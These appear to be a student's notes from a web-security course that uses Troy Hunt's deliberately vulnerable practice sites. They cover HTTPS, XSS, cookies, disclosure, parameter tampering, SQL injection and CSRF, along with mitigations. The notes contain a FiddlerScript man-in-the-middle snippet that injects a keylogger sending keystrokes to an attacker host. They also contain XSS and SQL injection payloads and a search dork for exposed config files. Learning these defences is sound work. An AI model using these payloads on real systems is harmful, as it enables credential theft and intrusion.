------------------------------------
Introduction
------------------------------------

Websites for course:

	- http://attacker.hackyourselffirst.troyhunt.com/
	- http://hackyourselffirst.troyhunt.com/

Chrome developper tool vs fiddler:
	- Fiddler behave like a HTTP proxy (sits between browser and the website)

Burp like inspector (inspector 21 add-on for fiddler 2)

------------------------------------
Transport Layer Protection
------------------------------------

Transport Layer Protection (HTTPS, SSL, etc.)
	- This is related to the man in the middle attack

	- 3 objectives:
		- Authenticity: Connecting to who? Garanty of identity?
		- Integrity: Request haven't been manipulated? Response haven't been manipulated?
		- Confidentiality: Eaves dropping? (Kept private?)

Man in the middle
	- Observe/modify a communication

Persisting authentification state via cookies
	- HTTP is state less
	- Auth cookie (Authentication cookie)
		- Is in the response of the authentication from the server
		- All subsequent requests (any requests) from the client includes the auth cookie so that the server always know who the requestor is.

Auth cookie via unsecure connection
	- If an attacker can intercept the auth cookie on unsecure request, it can reproduce any requests and receive a valid response (and therefor to be logged in)
	- It only takes one request so that the auth cookie is vulnarable and the attacker could highjack the session

Loading login forms over HTTP
	A login:
		- <insecure>(Request login in HTTP -> Login response in HTTP) -> <secure>(After that credentials are posted in HTTPS -> Response in HTTPS)
	- So, we atteck the form itself instead of the POST request (which is encrypted)

	In the OnBeforeResponse method in the FiddlerScript tab:

        if(oSession.HostnameIs("http://hackyourselffirst.troyhunt.com") && oSession.PathAndQuery == "/Account/Login") {
            // Remove any compression or chunking
            oSession.utilDecodeResponse();
            
            var oBody = System.Text.Encoding.UTF8.GetString(oSession.requestBodyBytes);

            // Inject the keylogger into the page
            oBody = oBody.Replace("</body>", "<script type=\"text/javascript\" src=\"http://attacker.hackyourselffirst.troyhunt.com/Scripts/keylogger.js\"></script><script type=\"text/javascript\">destination='http://attacker.hackyourselffirst.troyhunt.com/Keylogger/?k=';</script></body>");

            oSession.utilSetResponseBody(oBody);
        }

    	- An attacker can do that at any time on an unsecure connection
    	- Over HTTPS, an attacker can't modify the loggin page

Exploiting mixed-mode content: Loading a secure page
	All assets must be loaded securely to have the site secure
	For example: An HTTP ajax call in an HTTPS website.
		- To apply the correct scheme, : <script src="//ajax.googleapis/com[..]">
			- Automatically switch to secure/unsecure depending of the context

HSTS header (HTTP Strict Transport Security)(This a mititgation to have only HTTPS request)
	- It forces request from the browser to only be made over secure connection under specified circusmtences
	- For example: http://hackyourselffirst.troyhunt.com/Content/site.css contains the AuthCookie ...
		Response can contain Strict-Transport-Security: max-age=1440 (in minutes). This means that chrome cannot emit HTTP request to this site for the next day. If we do, it will be converted into a HTTPS request.

Summary
	- SSL is more than just encryption (the 3 objectives above)
	- Many points to do a man in the middle
	- If you need SSL, you also need to use it correctly (no sensitive cookies over HTTP, don't use HTTP to load the forms, do not embed insecure content in secure page (mixed content))
	- HSTS additional safety net

------------------------------------
Cross Site Scripting (XSS)
------------------------------------

Introduction
	- Untrusted data and sanitisation
	- Sanitisation practices
	- What is XSS?

Understanding untrusted data and sanitisation
	- What constitutes untrusted data? : 
		Integrity not verifiable, intent may be malicious (SQL injection, XSS, binary with malware, etc.)
	- Can come from the user (from a form, in the url, etc.)
	- Can come from the browser (cookies, request headers)
	- Can come from an external web service, our own DB (if you accepted untrusted data), etc.

The use of input sanitisation
	- Filter for what is acceptable or not
		- Like rejecting <>'/"\, etc.
			- This is blacklisting the characters. Rudementry, has holes
			- This is what we don't want today, can change over time
		- The whitelist is lower risk approach and is very explicit (can use regex for example)
	- Example, some website sanitized only on < since "without it, the nthis is not HTML tag"
		- This is why blacklisting is difficult and risky

Understanding reflected untrusted data
	- Typical request with untrusted data:
		- user request resource with untrusted data -> server response the data is reflected in the response (like the search in the demo: you searched for: '[...]'). It is how you can identify an XSS risk
	- For the site:
		- Request: <trusted>(www.mysite.com/Search?q=)<untrusted>(ferrari)
		- Response: <trusted>(you searched for <strong>)<untrusted>(ferrari)<trusted>(</strong>)

		Example:
			http://hackyourselffirst.troyhunt.com/Search?searchTerm=ferrari<i>enzo</i>
			you searched for <strong><i>ferrari</i></strong>
	- Then can inject different text, or even JS (executable stuff)

Output encoding concepts
	- An other protection against XSS, other than sanitization, is to display the reflecting data exactly as it was given by the user on the screen rather then reflected in the markup (the url)
	- Output encoding context can change the encoding
		For example, for <: HTML: &lt;
							CSS: \<
							JS: \x3ci\x3
							...
    - WHAT YOU SEE IN THE DEV TOOL IS MORE REPRESENTATIVE THEN WHAT IS REPRESENTED IN THE DOM
    	 For example in the site: / in a search term is in fact &#47; in the dev tool source code, html source is a better representation of what is returned by the server

We looked at reflected XSS, another is persistent XSS
	It is what is already in the DB
		For example, it has been saved by a user, and when loaded it does bad things

X-XSS-Protection header
	- Browser embeded protection against XSS
	- As a developper, you cannot rely on that. That is a bonus.
	- For example: in the response header: X-XSS-Protection:0 (value 0 means disable)
		- X means it is a non http standard header
	- Why to disable this? Their where cases where X-XSS could cause problems to some applications

Summary
	- Sanitization is first line of defence against XSS (holes can be easy to find, espacially with blacklisting)
	- Ouput encoding is critical for mitigating the risk of XSS
	- Don't trust your own data (often-overlooked threat)
	- Browser defences is additional, don't rely on it

------------------------------------
Cookies
------------------------------------

Cookies 101
	There are just a piece of text stored in the browser

	The server can set cookies via HTTP response header or can be setted via JS directly in the DOM
	Cookies are automatically passed back to the website in the header of each request
		GET http://site.com/ HTTP/1.1
		Cookie: name=value

	HTTP cookie exchange:
		request -> ser respond with set-cookie header -> subsequent requests automatically send the cookie

Cookie security:
		- Cookies frequently contain data of a sensitive nature
		- Browsers have some native defenses for cookie (same domain), but does not protect against XSS to have cookies
		- Can be more secured by tuning their attributes

	Cookie attributes
		Domain
		Path
		Expiration
		HttpOnly
		Secure

	If AuthCookie not flaged as HTTP, then it is accessible by client script. (Risk of session highjack)

	For example: seach term on unsecure website: ');alert(document.cookie);//

	This flag is set in the response header (HttpOnly)

	This is an easy mitigation that is quite easy to add a gives a good security protection (should still sanitize though)

Understanding secure cookies
	Flag cookies as secure:
		The AuthCookie won't be visible over HTTP (for example, when you get an image). The secure flag makes the browser do not send the AuthCookie over HTTP.

		But that mean you can never make a HTTP authentification.

	For AuthCookie, we want HTTP flag for no access by client and secure flag for HTTPS only.

Restricting cookie access by path.
	In Chrome dev. tool, you can see the Path on which the cookies will be sent (Resources -> Cookies -> Path). If path is / , then they will be sent we every request (images, page, etc.) even if they don't need them.

	On log off, the Password and the Email cookies are not cleared, for automatic log in.

	If a string end by a =, it is a sign that it is probably encoded in base64. (There is base64 decoding, so this is not cryptography persay)

Reducing risk with cookie expiration
	XSS, clickjack attacks, CSRF, etc, can take place when the cookies are active.

	Need to find the right balance between convinience and security

	In dev. tool. you can see the expiration date of cookies.

Using session cookies to further reduce risk
	The AuthCookie expiration can be set to session. It will be a session cookie, therefore, when the browser closes, the cookie is discarded (ex: Banking)

	There is always a trade between usability and security.

Summary
	- 3rd party lib are often in HTTP
	- HttpOnly is an essential flag for a cookie that is not nescessary via client script

------------------------------------
Internal Implementation Disclosure
------------------------------------

How an attaker builds a website risk profile
	In other words, how do they find security flaws?
		ex: What are the points of untrusted data entry?
			What sanitisation practices have been emplyed?
			What frameworks and plugins are used?
			What is the structure of the website?
			Is there something disclosed in the source code?

	NIST: National Institute of Standards and Technology
		List all known vulnerabilities
			Made to help the dev. to protect their product, but it can also helps the attackers

Server response header disclosure
	Type of server (ex: IIS/8.0)
	AspNet-Version
	AspNetMvc-Version
	X-Powered-By: (ex: ASP.NET)

	We want to get rid of this. there is no value for the end user, and the browser do not care. That way, the attacker would have to do more reshearch.

	If you want it, you can put it in a cookie, and the value crypted

Locating at-risk websites
	Look at the Apache Release History

	CVE: Common Vulnerabilities and Exposures

	https://www.shodan.io/ : search engine look for devices

HTTP fingerprinting of servers
	It is to be able to identify specific attributes of a website to know attributes of a website

	For example:
		In fiddler: composer -> to execute requests

	You can check the order of the attributes : in Apache 1.3.23 you see date first, in IIS/8.0 you see it last. So you can guest like that.

	If you change the HTTP version for an invalid one (ex: HTTP X.1) and see what happens:
		The 400 page that comes from the server is different between Apache 1.2.23 and IIS.8.0

	Turn off HTTP headers that disclose internal implementations
		Attacker won't find you on a search engine, but if he is determine, he can find a way to guest them

Disclosure via robots.txt
	It implements the robot exlusion (exclusion for crawlers, content that they should not index)

	Attackers would start probing on those paths

	Robots.txt can be seen by anyone.

The risks of leaking data in HTML source
	Comments (psw, zipfile download path, etc.), JS libraries (versions)

Internal error message leakage
	Ex: DB could not be contacted, data conversion did not work

	This can disclose the internal representaion of the code

		ex: https://hackyourselffirst.troyhunt.com/Make/200 does not exists, so we have a Yellow screen of death (ASP.NET) We can see code, name of the error, the stacktrace, the location of the source file (location of the server), version information, etc.

	So we have to properly handle unproper requests. (Have a fiendly error message, no error internal implementation disclosure)
		But be carefull to not leak any thing in the error url (error handling url ex: [...]Error?aspxerrorpath=/Make/200)

		Do not change the url

	Keep information away from attackers..

Lack of access controls on diagnostic data
	Not enough control on sensitive implementation data (logs, etc.)

	elmah -> error login module and handlers (popular logger for ASP)
		That can give cookies (AuthCookie.. ) and multiple server attributes

	There is the name of the website and the name of the server

	Best case: Just don't make the log accessible by the public website, send them somewhere else. Or at least do not expose it publicly, ask for special account at the very least

	filetype:config inurl:web.config inurl:ftp find web.config that are acessible over ftp

	Be careful of what data is public and what should be acessible only by the admin

Summary
	Keep information about frameworks and server versions private
		But don't rely on that
	Be conscious of what you are disclosing
	Internal exceptions should never bubble up to the user
	Internal logs must have proper acces controls (this can be catastrophic)

------------------------------------
Parameter Tampering
------------------------------------

Identifying untrusted data in HTTP request parameters
	What constitutes untrusted data? : integrity not verifiable, intent may be malicious, data may content payloads such as SQL injection, cross site scripting (XSS), ninaries containing malware, etc.

	Common sources of untrusted data:
		- from the user (form, query, etc)
		- from the browser (cookies, request headers)
		- from the DB, external service, etc.

	What can be tampered within an HTTP request?
		What can be sent by a browser can be sent by an attacker

		The HTTP verb (POST, GET, etc)
		The path
		HTTP version
		Accept (text/html, application/xml, etc.)
		User-Agent (the client: browser + version, OS, webkit + version)
		Referer
		Accept-Language (ex: en-US)
		Cookie
		Request body (ex: logon, they could be in clear text...) it is easy to manipulate request body

		Their can be "hidden fields", (made by dev.) they may have been ignore by dev. in regards to security, and are prone to JS injection.

Capturing requests and manipulating parameters
	In fiddler: 
		- drag the request to the composer
		- Modify the request body: in the example, you can change the user Id of the vote request, so you could vote for someone else.

	Need to do parameter check when parameters are in request body (in the case above, the server should return a 403 (forbidden))

Manipulating application logic via parameters
	Ex: You have already voted for this car (their is application logic behind this)

	Even if you do validation, (ex: can only vote once), you still can vote for the logged person via HTTP.

Testing for missing server side validation
	Attackers have acces to client, so if they want to by pass client validation, they can (ex: directly create and HTTP request)

	(To see if the validation is only client side, check Network tab in dev. tool.) If not, you can then manipulate the request and send XSS to the server, no validation done.

	In the example, persistent XSS attacks can touch anonimous users (like, loading the voter last name, but the last name is a XSS)

	If the attacker disable JS, and the validation is only client side, then XSS can be directly sent to the server.

Executing a mass assignment attack by exploiting model binding
	Use model binding and POST request to modify model value (ex: IsAdmin=true in the change name page.)

	To mitigate: either use a white list that the framework is allowed to change or a black list

HTTP verb tampering
	Sometimes, application comportement can change depending on the HTTP verb. (GET vs POST can sometime be use interchangebly)

	You can go around sanitization and validation if you do a POST instead of a GET for example (in the research, POST the searchTerm instead of doing a GET with that in url)

	Mitigation: It is only ever OK to load a page via GET, otherwise 404. (This is a hardline approach, but the more secure too)

Fuzz testing
	Common request payloads an attacker may test:
		- XSS: patterns to manipulate page source
		- SQL injection: patterns to manipulate query execution
		- Directory traversal: patterns to access system files

	Fuzz testing: can automate the process of bombarding an application with random data. Fuzz testing tools generally identify responses which could indicate a vulnerability is present.

	You take a request and then fuzz test it.

	(Right click on request -> intruder21)
		It highlight untrusted data that is sent via the request, this is where intruder will do fuzz testing on that.

		On payload tabs: this is the fuzz tests that will be applied.

		Result -> start test

		This is an easy way to find places where the site does not send a 200 OK, those places are a good starting point.

	There are fuzz testing DB (ex: fuzzdb)

	It does not automate the entire process, but it accelerate the process to find points of interest

Summary
	Always assume that all aspects of an HTTP request can be AND WILL BE manipulated attackers
	Don't rely on JS validation
	Automate your testing (fuzz testing)

------------------------------------
SQL Injection
------------------------------------

Understanding SQL injection
	First in top 10 OWASP is injection (including SQL)

	SQL injection: you start with a url request
		<trusted>(www.mysite.com/widget?id=1 -> select * from widget where id =) <untrusted>(1);

		ex: www.mysite.com/widget?id=1 or 1=1 -> select * from widget where id = 1 or 1=1
			Always true, so we get all widget\

Discovering dtabase structure via injection
	Types of SQL injection attack
		Explicit: (will put table or row names)
			- union-based attack (append a result set that is rendered to the markup)
			- error-based attack disclose information in an unhandled exception
		Implicit (blind) (look for conditions or true-false answer)
			- boolean-based: test if a particular condition is true
			- time-based: cause the response to be delayed in response to a test

	Different type of servers requires different SQL injection attack (IIS vs apache, etc.)

	For example: add a ' in the comment section of the vote break the DB insert. The error can be seen and can expose important stuff.

	Use failling request to expose data table names (select top 1 convert(int, name) from sys.tables)

	Need to be carefull when creating SQL injection, special characters are encoded (+ for concat in SQL is escape in HTTP, must use the encoded +)

	Could be able to set IsAdmin flag to true (or false to other, why not?)

Harvesting data via injection
	If you know table and column names, an attacker could eventually access to user name and passwords for example

Automating attacks with Havij
	You give it a target url, and it will list everything that it can find (tables name, columns name) and tell it to return us some data (like users and passwords)

Blind SQL injection
	Use this when internal data and structures are not disclosed.

	Example for order [...]Leaderboard?orderBy=PowerKw&asc=false -> select * from supercar order by PowerKw

	Example: 
	select * from supercar order by [PowerKw]

	, case when (select count(*) from sys.tables) = 0 then 1 else convert(int, 'x')

	[asc]

	So, even if the error handling is there, we can know stuff, if there is an error, then it tell us there is no 0 table in the DB.

Secure app patterns
	Parameterize a sql parameter so that it is no more a matter of concataining. No matter what value, it will always be used as a param. (How do you parameterize untrusted data in a sql sentence (critical!))

	Also, white list the values that we know to be good.

	Do proper paramiterization even if you do white list, they are mutually exclusive

Summary
    Untrusted data is something that comes around often
    Automating SQL injection is easy (there are open source tool for that)

------------------------------------
Cross Site Attacks
------------------------------------

Understanding cross site attacks (CSRF)
    Authentication is usually persisted by an AuthCookie, and is sent with each request, the website then identify and authorise the usre based on the cookie

    --> What if we could get the user to make a request they didn't want to do?

    resource requested with auth cookie -> (do the attacker request with the auth cookie of the user)

Testing for a cross site request forgery risk
    This kind of attack often require social engineering

The role of anti-forgery tokens
    This is the mitigation for CSRF

    page with a form is requested -> resultant page contains a token in a hidden field and one in a cookie (one anti-forgery token in each, they are paired when issued and are usually encrypted. They are also keyed to the current user. The token won't be usefull for anyone else)
    -> browser sends back both the hidden form token and the one in the cookie
    (website ensures tokens are a valid pair)

    Anti-forgery tokens add randomnesss to the request pattern
    An attacker does not have the token in the hidden form field so they can not reproduce it in the forged request
    The cookie provides verification of the token from the hidden field

    What if you put another user's anti-forgery token? 
        The anti-forgery tokens won't match

Testing cross site request forgery against APIs
    Make sure there is a match between the two tokens, then the risks of CSRF are mitigated

Mounting a clickjacking attack
    This is how we can do a CSRF with the anti-forgery tokens on. How?
        By adding an iframe to the DOM, this iframe can be src=[change password page]. Invisible, make the user click on the buttons that makes it change the password. The change password is sitting over the attack page, but is invisible.

    The 3D view in FF shows up this, even if they are hidden.

    How to mitigate that? With a X-Frame-Options (XFO) header (options: Deny, SameOrigin, Allow-From [URI])
        It specifies how the page may be "framed"
        The browser then:
            Deny: no framing allowed
            or SameOrigin: a frame on antoher page in the same site
            or Allow-From [URI]: specified site only

Summary
    CSRF depend on the user browser being tricked into issuing a request
    It simply creates a request of the correct structure and sends the attacker payload
    Anti-forgery tokens and randomness to the request
    APIs are at the same risk of CSRF, require the same defence
    A clickjack can easily circumvent CSRF protections
        Mitigated with XFO header